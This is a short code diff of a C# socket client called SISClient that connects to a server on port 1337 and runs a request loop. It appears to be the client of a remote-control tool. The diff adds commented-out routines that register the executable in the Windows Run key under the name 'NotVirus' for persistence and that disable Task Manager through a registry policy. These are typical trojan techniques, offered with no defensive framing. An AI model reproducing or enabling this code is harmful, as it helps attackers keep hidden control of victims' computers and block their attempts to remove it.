@@ -12,6 +12,9 @@ using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Management;
 using System.Net.NetworkInformation;
+using Microsoft.Win32;
+using static System.Net.Mime.MediaTypeNames;
+using System.Reflection;
 
 namespace SISClient
 {
@@ -19,11 +22,22 @@ namespace SISClient
     {
         private static readonly Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         private const int _PORT = 1337;
+
         static void Main(string[] args)
-        {
+         {
+            //ToggleTaskManager(true);
+            //RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            //reg.SetValue("NotVirus", Assembly.GetExecutingAssembly().Location);
             ConnectToServer();
             RequestLoop();
-        }
+         }
+
+        //public static void ToggleTaskManager(bool toggle)
+        //{
+        //    Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.LocalMachine;
+        //    Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+        //    key.SetValue("DisableTaskMgr", toggle ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);
+        //}
 
         private static void ConnectToServer()
         {
